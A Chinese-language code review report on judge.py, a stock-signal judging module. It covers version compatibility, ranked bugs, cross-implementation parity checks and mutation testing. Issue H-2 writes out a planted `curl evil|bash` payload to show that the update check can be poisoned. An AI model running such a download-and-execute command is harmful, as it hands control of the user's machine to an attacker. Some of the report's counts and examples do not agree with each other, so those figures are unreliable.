# 代码审查报告 · data-skill v1.0.8 · judge.py

**审查人**：code-review（工程实践视角）
**审查日期**：2026-10-26
**审查对象**：
- `holdle-mcp-server/skill/holdle-data-skill/judge.py`（753 行，v1.0.8 新增）
- `holdle_data.py` 的 v1.0.8 改动（`SIDE_MODULES` / 判定接入段 / 结尾判定状态）
- `tests/test_judge.py`（190 行，24 个用例）
- 提交：子仓库 `75c9c62`、父仓库 `fdaff5c`
**解释器**：`/Users/imac/holdle-workspace/data/klines/.venv/bin/python`（3.9.6）
**审查边界**：只审工程质量、兼容性、可维护性、测试质量、安全。**不重判投资方法论**（导师负责）。

---

## 〇、结论先行

### 能不能发到用户端

## ❌ **现在不能发。** 修掉 2 个 critical 后可以发（改动量都很小，都是话术/字段级修复，不动判定逻辑）。

一句话理由：**工程地基（版本兼容、跨版本确定性）实测比预期好得多，问题几乎全部集中在「输出层」——脚本算对了，但说错了。**

- 版本兼容这一项**实测过关**，而且过了四代环境（详见 §一），这条风险可以降级；
- 但有 1 处 **脚本自己跟自己矛盾**（同一份 JSON 两个字段结论相反，模型只会念错的那句），
  有 1 处 **承诺的字段被写死成常数**（`is_stale` 恒 False），会把停更数据当新鲜数据判定；
- 另有 1 个 high 是**昨天刚修过同一个坑又复发**（C6 只修了 note 没修话术），说明缺机制而不是缺人。

### 放行前的门槛（全部修完 + 补测试才算）

| 门槛 | 内容 | 修复量 |
|:--|:--|:--|
| **B1** | 修 C-1：`expired` 分支的 `R-BREAKOUT-NO` 话术按 `expire_reason` 分支 | ~12 行 |
| **B2** | 修 C-2：`is_stale` 实现真实陈旧度（或明确删除该字段并改文档） | ~15 行 |
| **B3** | 补 T-1 一致性守护（防止「改一处漏一处」，见 §四） | 新增 1 个脚本 |
| **B4** | `tests/test_judge.py` 补真实数据快照回归（当前全是合成数据，14 个变异体存活） | 新增 1 个用例文件 |

---

## 一、Python 版本兼容 —— ✅ 实测过关（这条风险可以降级）

任务书最担心的是「用户可能 3.7/3.8」。我把这条**实测到底**，不是读代码猜。

### 1.1 语法级验证（4 个真实解释器）

| 解释器 | 方式 | 结果 |
|:--|:--|:--|
| Python 3.9.6（工作区 venv） | `ast.parse(feature_version=(3,7))` | ✅ judge.py / holdle_data.py 均通过 |
| Python 3.8.20（`uv python install 3.8` 真解释器） | `ast.parse` + `py_compile` | ✅ 均通过 |
| Python 3.12.15 | 实跑 | ✅ 通过 |
| Python 3.7 | ⚠️ 本机无法安装（`uv` 无 3.7 macOS arm64 构建） | 用 `feature_version=(3,7)` 等价验证 |

`feature_version=(3,7)` 覆盖的正是「3.7 解析器会拒绝的 3.8+ 语法」。**若脚本含 3.10+ 语法，在 3.7 设置下必然报 SyntaxError** —— 实测没有。所以语法层面 3.7+ 可用。

### 1.2 3.10+ 语法逐项排查

| 关注点 | 结果 |
|:--|:--|
| f-string 嵌套同日引号 | ✅ 无（3.10+ 才放宽，本文件没踩） |
| 海象运算符 `:=` | ✅ 无 |
| `dict \| dict` 合并 | ✅ 无 |
| `X \| Y` 类型注解 | ⚠️ **有 2 处**：`judge.py:172` `-> list[dict]`、`judge.py:358` `-> dict \| None` |
| 内置泛型 `list[str]` | ⚠️ 同上（`list[dict]`） |
| `str.removeprefix` / `functools.cache` / `zoneinfo` / `math.isqrt` / `int.bit_count` | ✅ 全部无 |

**2 处注解为什么不炸**：`judge.py:35` 有 `from __future__ import annotations`，注解变成字符串、不在定义期求值。**实测证明**：

```
已知 3.9.6 环境：
  删掉第 35 行再 exec → TypeError: unsupported operand type(s) for |: 'type' and 'NoneType'
  保留第 35 行      → 正常 import
```

所以这是**单点依赖**：**这行 `__future__` 是 3.7/3.8/3.9 兼容的唯一护栏，一旦被删或被格式化工具挪到 docstring 之前/之后搞坏，整个模块 import 就炸**，而 `holdle_data.py:1126` 的 `except Exception` 会把它降级成「判定未生成」——用户只看到功能没了，看不出是语法问题。

> **建议（low，但成本极低）**：在 `tests/test_judge.py` 加一条**元测试**：
> ```python
> def test_future_annotations_guard_present():
>     src = pathlib.Path("judge.py").read_text(encoding="utf-8")
>     assert "from __future__ import annotations" in src
> ```
> 并把 `-> list[dict]` / `-> dict | None` 改成 `typing.List[dict]` / `typing.Optional[dict]`，从根上不依赖那行。

### 1.3 依赖缺失时的降级 —— ⚠️ 会崩但会**明确告警**（可接受，但话术误导）

实测（屏蔽 numpy 后 import judge）：
```
无 numpy 时 import judge -> ImportError: No module named 'numpy'   ← holdle_data.py 会捕获
```
`holdle_data.py:1104-1128` 的 `try/except Exception` 包住了 `import judge`，所以**不会崩主流程**，输出：
```
  ⚠️ 判定未生成（No module named 'numpy' ...）；行情数据不受影响，仍可正常使用。
  ...
判定：❌ 本次未生成（原因见上方告警）。请勿用你的推理替代判定结果，
```
✅ 这是**可见失败**，不是静默失败。判定模块「缺依赖 → 只降级不崩」这条任务书要求是达成的。

⚠️ 但有一处 **medium**：告警说「行情数据不受影响，仍可正常使用」——如果连 numpy 都没有，那 pandas 也 import 不了（`holdle_data.py:46` 顶层 `import pandas` 直接崩），根本走不到这里。所以这句打印在「缺 numpy」场景下是**不可达安慰话**，真正会触发它的只有「judge.py 文件缺失/损坏/语法错」。建议把文案改成按异常类型区分（`ImportError` → 提示装依赖；其它 → 提示 --auto-update）。**不阻塞**。

---

## 二、pandas 版本兼容 + 跨版本确定性 —— ✅ 实测四代环境 12/12 一致

这是本次审查里**最有价值的正向证据**，之前没人做过。

### 2.1 环境矩阵（真实安装，真实数据跑）

用 `uv` 建了 3 个额外的真实环境，同一批真实前复权日线（600519/603637/000333/600743，各边 3 个锚点 = 12 组）：

| 环境 | numpy | pandas | 与基准一致 |
|:--|:--|:--|:--|
| py3.9.6（基准，工作区） | 2.0.2 | 2.3.3 | 基准 |
| py3.8.20 | 1.24.4 | **2.0.3** | **12/12 逐字段一致**（含 `final_text` 全文） |
| py3.8.20 | 1.21.6 | **1.5.3（1.x）** | **12/12 逐字段一致** |
| py3.12.15 | 2.5.4 | **3.1.0（未来版）** | **12/12 逐字段一致**，0 条 FutureWarning |

比对字段：`status / indeterminate_reason / state_a.status / state_a.month / window.event / event_month / alive.is_alive / entry.status / entry.ref_price / final_text`。

> 这份数据要留档：**它就是「跨版本不变性」的证书**。说明 `_resample_monthly`（`judge.py:139-166`）那段「用 `reindex(fill_value=nan)` 避免 object 列再 fillna」的写法是真起了作用的——pandas 1.5 / 2.0 / 2.3 / 3.1 四代都稳定。
> 顺带对照：知识库侧 `l1_engine.py:144` 的 `fillna(False).astype(bool)` 在 pandas 2.3 上**已经报 FutureWarning**（我在差分测试时看到满屏），judge.py 这边没这个问题。**这是 judge.py 做得比知识库更好的地方**。

### 2.2 一个未被利用的健壮性缺口（low）

`_resample_monthly` 没有处理**重复日期**和**乱序**（`judge.py:139-166`）：
- 乱序：`judge.py:613` 有 `sort_values("date")` ✅
- 重复日期：没有 `drop_duplicates`。若数据源返回同日两条（历史上新浪/雅虎都出现过），`g["date"].count()` 会把 `n_days` 算多，`g["close"].last()` 会取到不确定的一条。

实测影响：当前数据源不发重复日期，所以不是现存 bug。但作为**要发到用户端的脚本**，建议在入口加一行 `daily = daily.drop_duplicates(subset=["date"], keep="last")`。成本 1 行。

---

## 三、分级问题表

### 🔴 critical

| # | 位置 | 问题 | 后果 | 修法 |
|:--|:--|:--|:--|:--|
| **C-1** | `judge.py:738-740`（话术）<br>`judge.py:471-487`（`_build_entry`） | **同一份 JSON 自相矛盾**：`_build_entry` 在「窗口已死、但数据恰好截到月末」时返回 `status="expired"` + `expire_reason="data_end"` + `expire_note="窗口若仍存活，入场等待继续有效（未到方法论期限）"`；但主流程 `R-BREAKOUT-NO` 无条件说「**入场有效期已过**（截至 X），期间日K未突破入场参考价」 | 用户/AI 被要求**只转述 `final_text`**，于是只会念错的那句。用户问「能不能入场」时看到的结论与方法论**完全相反**。触发条件是「数据截止日 == 月末」，A股月末收盘后拉数据**必然命中** | 按 `en.get("expire_reason")` 分支出两套话术：`data_end` → 「截至数据末端 X 仍未突破；窗口仍存活，入场等待继续有效」；`window_closed` → 保留原文 |
| **C-2** | `judge.py:648` | `"is_stale": False` **写死为常数**。judge.py 里**没有任何陈旧度计算**（`grep is_stale` 只有这一行；全文件无 `_stale_info` 等价物） | 停更股会被当新鲜数据判定，且 `is_stale` 永远 false。契约文档 `01_判定输出格式_v0.3.md` §二.1 明写「消费端按 `is_stale or replay_stale` 警示」「**别把它合并回去**」，知识库侧 `data_source._stale_info`（阈值 `STALE_TRADING_DAYS = 2`）已实现。用户端这半个契约是空的 | 移植 `_stale_info`（约 15 行，纯 pandas，无新依赖）：`tdays = max(pd.bdate_range(td, now).size - 1, 0); is_stale = tdays > 2`，`as_of` 时按 `as_of` 算 |

**C-1 实测证据**（真实数据，可复现）：
```
600743.SH  as_of="2026-05-29"（恰为月末）
  entry.expire_reason = "data_end"
  entry.expire_note   = "截至数据末端 2026-05-29 仍未突破入场参考价；窗口若仍存活，入场等待继续有效（未到方法论期限）"
  final_text 尾       = "...该窗口目前仍存活。按方法论的入场参考价是 3.53 元（不是建议买入价）。
                        入场有效期已过（截至 2026-05-29），期间日K未突破入场参考价。"
                        ↑ 同一句里先说"窗口存活"，再说"有效期已过"

000333.SZ  as_of="2026-08-31"（同样命中，非孤例）
```

**C-2 实测证据**：
```
600743.SH  as_of="2026-09-30"（数据停在 26 天前）
  data_snapshot.trade_date = "2026-09-30"   is_stale = False
```

### 🟠 high

| # | 位置 | 问题 | 后果 | 修法 |
|:--|:--|:--|:--|:--|
| **H-1** | `judge.py:477-486` 的注释 vs `judge.py:738-740` | **同一个坑第二次踩**：477-486 行的注释自称「2026-10-25 修复 C6（代码审查复核）」，专门处理了 `data_end` 场景并写了 `expire_note`，但**话术层没跟上**。知识库侧 `judge_service.py` 也是同一个毛病（我实测确认，两边都错） | 说明「加了防御字段但没人用」是团队习惯性疏漏，不是个人失误。**只修这一次，下次还会犯** | 修 C-1 时同步加断言测试：**凡 `entry.expire_reason == "data_end"`，`final_text` 不得含「有效期已过」**（见 §五 测试建议） |
| **H-2** | `holdle_data.py:266-270`（附属模块校验） | 校验只看两个字符串：`"HOLDLE 判定模块 judge.py"` 和 `"def judge("`。**实测**：一个只含这两处字符串的恶意 `judge.py`（`os.system("curl evil|bash")` + 假 `judge()`）**通过校验** | 这是「防投毒」装饰，不是防护。真下发了恶意文件，用户端会执行 | 主脚本已有 `VERSION` 一致性校验（`holdle_data.py:217-221`），**judge.py 缺同类校验**。建议：`judge.py` 增加 `JUDGE_VERSION = "1.0.8"`，更新时比对远端 `version.json` 里的对应字段；或直接校验 sha256 |
| **H-3** | `holdle_data.py:242-280` | **版本一致性缺口**：主脚本更新有「下载内容的 VERSION ≠ 期望版本 → 中止」（防 CDN 滞后），**附属模块没有**。若 CDN 给了旧版 `judge.py`，两版都含那两个校验字符串 → **通过校验 → 覆盖成旧版 → 新旧混搭，且无任何提示** | 用户端可能跑「v1.0.8 主脚本 + v1.0.7 judge.py」组合，判定结果与预期不符且查不出来 | 同 H-2：给 judge.py 加版本号并校验；至少把 `SCHEMA_VERSION`（已有 `"0.4"`）纳入校验 |
| **H-4** | `holdle_data.py:246` + `judge.py` 分发 | `SIDE_MODULES = ["judge.py"]` 是**裸相对路径**，写入 `os.path.join(_base_dir, _mod)`。若将来有人把 `SIDE_MODULES` 写成 `"../judge.py"` 或 `"sub/judge.py"` → **路径穿越**，可写到 skill 目录外 | 现在 `"judge.py"` 是安全的，但这是一行就能引入的漏洞 | 加白名单断言：`assert os.path.basename(_mod) == _mod and _mod.endswith(".py")` |
| **H-5** | `judge.py:738-740` + `holdle_data.py:1126` | **判定失败时是「可见失败」✅，但 dump 失败会漏掉半截文件**：`dump()` 用 `open(path,"w")` 直接写目标；若写到一半盘满/权限错 → 留下**半截 JSON**，上一轮的好判定被覆盖成坏文件，模型读到 `json.load` 报错 | 用户端「上一次还能判，这次读不出来」 | 改成写 `.tmp` 再 `os.replace()` 原子替换（3 行） |

### 🟡 medium

| # | 位置 | 问题 | 修法 |
|:--|:--|:--|:--|
| M-1 | `judge.py:735-737` | `R-MISS5` 话术硬编码「约 5%」，而常量是 `MISS5_PCT`。改阈值忘改话术 → 数字说谎 | 用 `MISS5_PCT*100` 格式化（与 `judge.py:737` 已有的 `%%` 写法保持一致） |
| M-2 | `judge.py:190, 317, 380` | `RECENT_MONTHS` 定义了**三次**（模块级 `judge.py:54` + 两个函数内 local 重定义）。函数内的把模块常量遮蔽了 | 删掉两处 local，直接用模块常量；补测试 |
| M-3 | `judge.py:245` | `last_closed_pos` 赋值后从未使用（ruff F841）。这是「续命标签」功能的残骸 | 删除，或实现续命标签 |
| M-4 | `judge.py:203-205`、`judge.py:280-285`、`judge.py:49-51,110-113` | 三处**不可达分支**：`close_rule="base"`（默认值，但调用处恒传 `"adjacent"`）、`reason="柱>DEA不开窗"`（`elif hard_gate` 保证 `hard_gate` 真）、`sticky_mode="d06"`/`"abs"` 档 | 要么加注释说明「对照档，仅测试用」，要么删。现在状态是「看起来支持、实际不支持」，会误导未来的维护者 |
| M-5 | `judge.py:664` | 次新股判据 `(monthly["ym"].iloc[-1] - monthly["ym"].iloc[0]).n` —— `ym` 是 `period[M]`（`judge.py:166` 的 `reset_index()` 产出）。**这条同时依赖 `judge_state_a` 不改 `ym` 列类型**，跨函数隐式契约，无测试守护 | 改成从 `daily["date"]` 算月数，或加注释 + 测试 |
| M-6 | `judge.py:594-609` vs `judge.py:688-748` | **不可判分支返回的 JSON 结构不完整**：`data_missing` / `finance_industry` / `insufficient_history` 三条路径直接 `return _finalize(out)`，**`data_snapshot` 仍是 `None`**。而正常路径有 `data_snapshot` | 消费端（MCP/SKILL Step 3）若读 `data_snapshot.trade_date` 会 `AttributeError`。建议在 early return 前也填最小 `data_snapshot`（`trade_date`/`data_end`/`as_of`） |
| M-7 | `holdle_data.py:1137` | 注释说「判定状态必须显式说清」，但条件复用了 `not daily.empty`。若 `daily` 非空而 `adjust != forward`，走 elif 分支 ✅ 没问题；但**若 `daily` 为空**（拉取失败），既不进 if 也不进 elif → **一行判定状态都不打印** | 用户只看到「日K获取失败」，不追问就不知道判定没做。改成三分支覆盖空数据 |
| M-8 | `judge.py:166` + `judge.py:286-294` | 停牌月逻辑：`prev_h = h` 在 `judge.py:216`（停牌月）和 `judge.py:296`（正常月）都赋值。但 `judge.py:252` 的 `prev_prev = monthly.iloc[i-2]["hist"]` **用的是原始序列下标，跳过停牌月** → 停牌月前后的「红柱内回落」判据会跨过停牌月比较 | 属方法论口径，**交导师确认**。我只标出「两处对 prev 的取值口径不一致」这个工程事实 |
| M-9 | `holdle_data.py:123` | `float(open(stamp_file).read().strip())` —— 文件句柄不关（Windows 上会锁文件，且 `ResourceWarning`） | `with open(...) as f:` |

### 🔵 low / nit

| # | 位置 | 问题 |
|:--|:--|:--|
| L-1 | `judge.py:358` | `-> dict \| None` 依赖 `__future__`（见 §1.2）；同时 `dict` 作注解名遮蔽了内建 `dict`（nit） |
| L-2 | `judge.py:116-122` | `_r()` 用 `except Exception: return None` 吞掉一切 —— 若传进来不可转 float 的对象，悄悄变 None 而不是暴露 |
| L-3 | `judge.py:522` | `_month_closed` 用 `pd.Timestamp.now()` 做"距今 3 天"判断 —— 判定函数**读系统时钟**，同一份数据不同日子跑出不同结果（可复现性受损）。`as_of` 场景下更是语义混乱 |
| L-4 | `judge.py:641` | `pd.Timestamp(as_of).normalize()` 在 `as_of` 已解析过一次（`judge.py:624` 有 `a`），重复解析 |
| L-5 | `tests/test_judge.py:14` | `import importlib.util` 未使用（ruff F401） |
| L-6 | `requirements.txt` | **没列 numpy**（judge.py 直接 `import numpy`）。用户按 README `pip install ... pandas` 装，pandas 会带 numpy，所以实际没事；但 requirements 与代码不一致 |
| L-7 | `requirements.txt` / 文档 | **没列 pytest**，而 `tests/test_judge.py` 和 SKILL/README 都写 `python -m pytest tests/ -q`。我这次审查只能用替身 runner 跑（见 §五） |
| L-8 | `README.md` / `SKILL.md` | **全文没有 Python 版本要求**。用户端「参差」的主要原因就是没人告诉他们要 3.7+ |
| L-9 | `judge.py:598` | `generated_at` 用本地时区 `datetime.now()`，无 tz 标注。跨时区用户对不上 |
| L-10 | `judge.py:333-334, 458-459, 481-485` | 多处 >100 字符长行（ruff E501，10 处），可读性 |
| L-11 | `judge.py:606, 616, 626, 631, 659, 665, 715, 721` | 单行多语句（`;`，ruff E702，9 处），断点调试困难 |
| L-12 | `judge.py:533, 618, 628, 633, 654, 661, 667, 677, 700, 704, 706, 709, 729, 737, 740, 743, 746` | `%` 格式化与 f-string 混用（ruff UP031，17 处） |

### ✅ 查过但没问题的（避免重复劳动）

| 项目 | 结论 |
|:--|:--|
| 异常处理吞掉 `KeyboardInterrupt`/`SystemExit` | ✅ `holdle_data.py:1126` 和 `1148` 的 `except Exception` 不捕获 `BaseException`，Ctrl-C 与 `sys.exit()` 仍能穿透。**任务书担心的问题不存在** |
| 性能 / O(n²) | ✅ 6836 根日线单次 **5 ms**（中位 5ms，最坏 12ms）。`detect_windows` 里 `monthly.iloc[i]` 虽是 pandas 逐行取值但只有 ~300 次，可忽略。**相对网络拉取的 5-30 秒，性能完全不是问题** |
| 输出 JSON 体积 | ✅ 单次 ~4 KB，无膨胀 |
| numpy 未使用 | ✅ `np` 确实有 1 处使用（`judge.py:202`），不是死 import |
| `dump()` 序列化安全 | ✅ 实测输出全部 JSON 原生类型（str/int/float/bool/None），无 `Timestamp`/`numpy.float64` 漏出；float32/NaN 输入也安全 |
| ruff 安全性规则（S/B/ASYNC） | ✅ judge.py **All checks passed**（0 命中） |
| 父子仓库 judge.py 是否不一致 | ✅ md5 相同（`1dad8f0e4b08...`），父仓库 `fdaff5c` 与子仓库 `75c9c62` 同步 |

---

## 四、【重点】两份实现「改一处漏一处」——可验证机制方案

### 4.1 先把风险的真实拓扑画清楚

任务书说的「两份」其实比两份复杂。实测清点：

```
① 知识库引擎     13_回测试验/scripts/l1_engine.py
                  ├─ macd / resample_monthly / judge_state_a / _dea_is_near_zero / _is_sticky
                  └─ detect_windows                       ← judge.py 的直系来源
② 知识库判定服务 13_回测试验/AI脚本化/judge_service.py
                  ├─ _build_window / _build_entry / _build_state_a / _finalize
                  └─ judge()（含 as_of、陈旧度、话术全部）
③ 用户端判定模块 skill/holdle-data-skill/judge.py
                  └─ ①② 的移植 + 重写（自己实现了 _resample_monthly、_month_closed、_state_a_sentence）
④ 父仓库副本     holdle-mcp-server/skill/holdle-data-skill/judge.py
                  └─ 与 ③ **是同一个文件**（无 .gitmodules，两个 git 都跟踪它）
```

**实测的文本保真度**（`ast` 抽函数体，逐字 diff）：

| 函数 | 相似度 | 差异性质 |
|:--|:--|:--|
| `detect_windows` | **1.000** ✅ 逐字一致（129 行） | 无 |
| `_build_window` | **1.000** ✅ 逐字一致（53 行） | 无 |
| `_build_entry` | 0.992 | **仅 `qfq_` 前缀替换**（机械移植，如承诺） |
| `macd` | 0.922 | 仅 import 来源不同 |
| `_r` | **1.000** ✅ | 无 |
| `_is_sticky` | 0.201 | 大部分是删了长 docstring；**逻辑等价**（`STICKY_UNDECIDABLE = None` 对 `None`） |
| `_finalize` / `_state_a_sentence` | 0.261 / 0.178 | 各自重写（预期内） |

**结论：三个「号称机械移植」的函数（`detect_windows` / `_build_window` / `_build_entry`）确实是保真的。承诺不假。**

**但风险不在「现在像不像」，而在这三个事实**：

1. **两份是独立演化的**。`l1_engine.py` mtime 10-25 21:01，`judge_service.py` mtime 10-26 08:37，`judge.py` 10-26 09:11 —— **知识库侧在 judge.py 冻结之后还在改**（轨道A as_of、轨道B 日历都动过）。下一次知识库改 `detect_windows`，judge.py 不会自动知道。
2. **两边都有各自的测试，但没有一条测试跨两边**。我全工作区搜过：`judge_service` 没有任何测试引用它；data-skill 的 `tests/` 里没有一行提到 `judge_service`；知识库的 `acceptance_check.py` / `e2e_test.py` 不 import data-skill。**「改一处漏一处」的检测责任，两边都没有人接**。
3. **注释「勿手改」是反向工作的**：`judge.py:169` 写着「以下三段：从知识库已验证实现机械移植（勿手改）」，但**没有任何东西能验证它没被手改**。任务书要的正是这个。

**而且这个风险已经在别处兑现过**：对比 `judge.py:477-486` 的 C6 修复与知识库侧——知识库也有同样的 `expire_note` 逻辑、也犯同样的错（我实测 `600743.SH @2026-05-29` 在知识库侧也输出「入场有效期已过」）。**这说明两边的「坑」是同步继承的，靠人眼同步必然漏。**

### 4.2 方案：三层机制，从「能不能发现」到「能不能拦住」

原则：**注释是承诺，测试是证据，哈希是证据的证据。** 三层都要，但第 1 层就够解决 90% 的风险。

---

#### 第 1 层（必做，工作量 ~2 小时）——**跨实现差分测试，纳入 CI 阻断**

核心思路：**不比对代码文本（会被格式差异淹没），比对「行为」**。两个实现喂同一批**真实数据**，输出逐字段比对。

新建 `holdle-mcp-server/tools/judge_parity_check.py`：

```python
#!/usr/bin/env python3
"""judge.py 与知识库 judge_service 的判定一致性守护（parity check）。

判定逻辑在两处独立维护（知识库 judge_service + 用户端 judge.py），
本脚本用真实行情做差分，任一组不一致即以非零退出码阻断发布。

用法：python tools/judge_parity_check.py [--strict]
依赖：知识库 13_回测试验 目录可读（CI 里同仓或 path 注入）
"""
import json, sys, pathlib, hashlib

SYMBOLS  = ["600519.SH", "603637.SH", "000333.SZ", "600743.SH", "601318.SH"]  # 含金融股分支
ANCHORS  = ["2026-04-30", "2026-05-29", "2026-08-31", "2026-01-30", "2025-06-30", None]

# 🔴 只比「判定语义」，不比元数据/话术时态（各自刻意改的部分要显式登记，不靠人记）
SEMANTIC = ("status", "indeterminate_reason", "state_a.status", "state_a.month",
            "state_a.month_closed", "window.event", "window.event_month",
            "window.alive.is_alive", "window.alive.close_month", "window.alive.close_reason",
            "entry.status", "entry.ref_price", "entry.green_day", "entry.switch_month")
# 已知且已批准的差异（白名单必须带「为什么」，并定期复核）
KNOWN_DIFF = {
    "required_statement.units[].text": "as_of 回放时态措辞：目前/当时、当前/此时（2026-10-26 各自刻意改）",
}
```

**关键设计（针对「改一处漏一处」的三个致命细节）：**

1. **白名单必须「登记差异原因」，不能「静默忽略」**。这样每次跑都会打印「已知差异 N 处，最近复核日期 X」，逼人周期性回看。现在两边已经有两处措辞差异（「目前/当时」「当前/此时」）——**它们应该是被登记过的，而不是被 `if k not in fk: continue` 悄悄跳过的**。

2. **必须喂真实数据，不能用合成数据**。我这次实测就证明了这个必要性：合成数据（`make_daily`）跑出来的判定永远落在简单分支上，**12 个真实锚点里只有 1 个能跑到「窗口已死但数据截在月末」这个 C-1 分支**（`603637.SH @2026-05-29`）。合成数据永远抓不到它。

3. **退化为纯文本快照也要做**：如果 CI 环境拿不到知识库（服务器上只有 MCP 仓库），退而求其次——**把知识库的输出存成 golden JSON 提交进仓库**，CI 只跑 `judge.py` 与 golden 比对。这样知识库侧的改动会通过「knowledge-base → 更新 golden」的显式动作传导，**漏更新 golden 就是 CI 红**，同样堵住了「漏一处」。

**接入点（现成的）**：`holdle-mcp-server/tools/align_check.py` 已经是一个「断档即非零退出码阻断部署」的机制（C1-C8 八类检查，注释里明确写着「断档即输出 ❌ 并以非零退出码阻断部署」）。**不要再造一个门禁**——直接在 `align_check.py` 里加 **C9：判定模块跨实现在地一致性**，复用已有的 `❌ 阻断 / ⚠️ 提示` 分类和退出码语义。这是「现有方案优先」原则。

---

#### 第 2 层（必做，工作量 ~1 小时）——**变异测试，把「注释」变成「证据」**

`judge.py:169` 那句「勿手改」没有验证手段。变异测试正好补这个洞：**把每一处不该改的地方故意改坏，测试必须变红**。

我这次已经在 `judge.py` 上跑了 **20 个变异体**，结果如下（这是可以固化成 CI 的）：

**✅ 被杀死的 5 个**（说明这些地方测试有效）：

| 变异 | 结果 |
|:--|:--|
| `REL_STICKY_RATIO 0.03 → 0.3` | ✅ 杀死（2 例失败） |
| `REL_STICKY_RATIO 0.03 → 0.99` | ✅ 杀死（2 例失败） |
| `MISS5_PCT 0.05 → 0.5` | ✅ 杀死 |
| `NEW_MONTHS 30 → 3` | ✅ 杀死 |
| W-01 硬闸 `h <= dea` → `h >= dea` | ✅ 杀死 |
| `DEA_NEAR_ZERO_FRAC 1e-6 → 1e-3` | ✅ 杀死 |
| `detect_windows` 调用处 `rel_ratio → 0.9` | ✅ 杀死 |

**❌ 存活下来的 13 个**（说明这些地方**没有任何测试在管**）：

| 存活变异 | 意味着什么 |
|:--|:--|
| `_build_window` 内 `RECENT_MONTHS 12 → 1` | **12 个月久远过滤没被测** |
| `_build_entry` 内 `RECENT_MONTHS 12 → 1` | 同上 |
| 日K绿柱条件 `hist_d < 0` → `hist_d < -1e9`（永不绿） | **入场流程 E-01 完全没被测** |
| E-02 参考价 `max(high)` → `min(low)` | **参考价公式没被测**（这是被点名的 P0 口径） |
| C1 关窗 `ref = base_hist` → `+inf`（永不关） | **窗口关闭通道没被测** |
| 状态A 三条件去掉 `dif >= 0` | **SA-01 残缺没被测** |
| 矮转高前提去掉「前月绿柱」 | **开窗前提没被测** |
| `as_of` 截断 `<` vs `<=` | **未来数据边界没被测** |
| 月度重采样去掉 `ffill`（停牌月不补） | **停牌月处理没被测** |
| `close_rule` 从 `"adjacent"` 改 `"base"` | ⚠️ **调用处参数变更不被检测**——这正是「真实误改」的样子 |
| 判据改成吃 `round(2)` 数据 | ⚠️ **铁律 2「必须喂未取整」没有机制兜底** |
| `is_stale: False` → `None` | 陈旧度字段无人管（与 C-2 呼应） |

**最关键的一条存活变异**：`close_rule="adjacent"` → `"base"`。这不是我瞎构造的——它是**维护者真实会犯的错**（`detect_windows` 的 docstring 写着 `base` 是"封版口径"，很容易被人以为该用 base）。而这条改动**会让开窗/关窗结论整体偏移，24 个测试全绿**。

**固化成 CI 的做法**：`holdle-mcp-server/tools/mutation_smoke.py`，把上表 20 个变异体写成配置，每次 CI 跑，**任何一个「该被杀死却没死」的变异体 → 报告「判定逻辑出现无守护的改动」并以非零退出阻断**。

> 这比注释强在哪：注释说「勿手改」，变异测试**证明「即使手改了，也拦得住」**。而且它还会持续发现**新出现的**无守护区域（比如将来加个 `LIVE_DAILY_BARS`，会立刻暴露）。

---

#### 第 3 层（建议，工作量 ~1 天）——**头文件哈希锚定 + 漂移分类**

对「机械移植」这三个函数（`detect_windows` / `_build_window` / `_build_entry`），用 `ast` 抽函数体、**归一化**（去注释、去 docstring、`qfq_` 替换、空白折叠）后算 sha256，写进 `judge.py` 头部：

```python
# 机械移植指纹（由 tools/judge_parity_check.py 生成，勿手改）
PORTED_FINGERPRINTS = {
    "detect_windows": {"src": "13_回测试验/scripts/l1_engine.py", "sha256": "…", "src_rev": "l1_engine@f741f0b"},
    "detect_windows": {"src": "13_回测试验/scripts/l1_engine.py",   "sha256": "…"},
    "_build_window":  {"src": "13_回测试验/AI脚本化/judge_service.py", "sha256": "…"},
    "_build_entry":   {"src": "13_回测试验/AI脚本化/judge_service.py", "sha256": "…"},
}
```

CI 检查逻辑（**漂移分类**，对应 `align_check.py` 已有的 C1-C8 风格）：

| 情况 | 判定 | 处理 |
|:--|:--|:--|
| 知识库源改了 **且** judge.py 同步改了（哈希匹配） | ✅ | 放行 |
| 知识库源改了，judge.py 没改 | ❌ **阻断** | 「知识库 detect_windows 已变更，judge.py 未同步」 |
| 知识库没改，judge.py 改了 | ❌ **阻断** | 「judge.py 的 detect_windows 被手改」（**这正是「勿手改」需要的东西**） |
| 两边都改但内容不同 | ❌ 阻断 | 「移植漂移，需人工裁决后更新指纹」 |

> 这一层的价值：**把`勿手改`从愿望变成可判的两向漂移检测**。第 1 层是「行为对不对」，第 2 层是「哪块没人管」，这层是「这段代码到底谁家的」。

---

#### 为什么不是「把代码抽成公共包」

这是最彻底的方案，但**我明确不建议现在做**，理由：

1. **用户端不能依赖知识库**。`judge.py` 要单独发到用户电脑，用户机器上没有 `13_回测试验/`。抽公共包意味着要么把包也发下去（增加一个分发物 + 一个版本同步点，风险反而上升），要么用户端 `import` 失败（判死）。
2. **知识库那份有大量用户端用不到的东西**：`l1_engine` 读 parquet 底库、`judge_service` 走网络拉数、`data_source` 带缓存和日历。硬抽公共包要剥离这些，等于重写。
3. **两份的定位不同**：知识库那份要能跑全市场回测（性能/批量优先），用户端这份要能单股即时判定且有话术层（可读性优先）。同一个算法、两个消费面，注定了会分叉。
4. **已经有更便宜的办法达到同样效果**：第 1 层差分 + 第 2 层变异，**成本 3 小时，覆盖率等价**，且不引入新分发物。

如果将来判定逻辑模块变大（比如 >1500 行）或用户端也要跑回测，再考虑抽包；那时第 1 层差分测试会自然地从「跨实现」变成「跨版本」，机制不用改。

---

## 五、测试质量 —— ⚠️ 24 例全绿，但**抓到 bug 的能力很弱**

### 5.1 先说事实

- 结构完整：分了 6 个类，覆盖「不可判不猜 / 结构性隔离 / 话术拼装 / 常量栅栏 / 窗口关闭不下发参考价 / as_of 回放」
- **自我校验做得好**：`tests/test_judge.py:149` 和 `:160` 有 `assert checked > 0, "样本里没有出现XXX情形，本测试空转"` —— 这是**对抗「断言空转」的正确姿势**，值得表扬（任务书专门问了这个）
- 我实测 24/24 通过。

> **环境说明**：工作区 `.venv` **没装 pytest**，`pip install` 到系统缓存目录被沙箱拒绝。我写了一个最小 pytest 替身（`/tmp/review/mini_pytest.py`，实现 `raises`/`fixture`/`mark.parametrize`/`importorskip`/`approx`）跑通：**judge 24/24、holdle_data 13/13**。这说明**测试本身没问题，是环境没备齐**（见 L-7）。建议把 `pytest` 加进 `requirements-dev.txt` 并在 CI 里固定。

### 5.2 但抓 bug 能力弱，三个具体证据

**证据 1：`checked > 0` 的门槛太低，等于「碰巧命中」**

```python
# tests/test_judge.py:141-149
for seed in range(12):
    ...
    if w.get("event") not in (None, "none") and alive is False:
        checked += 1
assert checked > 0, "..."
```
